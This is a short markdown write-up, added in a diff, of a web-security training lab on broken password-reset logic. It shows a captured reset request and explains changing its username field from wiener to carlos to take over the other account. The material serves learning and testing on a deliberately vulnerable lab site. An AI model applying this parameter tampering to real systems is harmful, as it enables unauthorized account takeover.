@@ -1,0 +1,36 @@
+##Password reset broken logic
+
+To solve this lab 
+first we need to rest given my credentials: wiener's password
+by using forget password method
+After tha we receive a rest password link by email client
+then access this link and capture it with burpsuit when submitting the new password;
+
+after capture this request we do some modification for acccessing the carlos account.
+
+burpsuit capture request for wiener account: 
+
+    POST /forgot-password?temp-forgot-password-token=xnc3feyoevc5xymk9zkqjztbwyydvttz HTTP/2
+    Host: 0af7001d04775a8880b135a800240019.web-security-academy.net
+    Cookie: session=ED0d6SpO3ux1z7mAVm4zA9n46F5dkRyk
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.9
+    Accept-Encoding: gzip, deflate, br
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 115
+    Origin: https://0af7001d04775a8880b135a800240019.web-security-academy.net
+    Referer: https://0af7001d04775a8880b135a800240019.web-security-academy.net/forgot-password?temp-forgot-password-token=xnc3feyoevc5xymk9zkqjztbwyydvttz
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Priority: u=0, i
+    Te: trailers
+    temp-forgot-password-token=xnc3feyoevc5xymk9zkqjztbwyydvttz&username=wiener&new-password-1=1111&new-password-2=1111
+
+
+    in lat line we chagne the username wiener to carlos and chagne the passwords too
+    then send the request to server and carlos password are chagned.
+
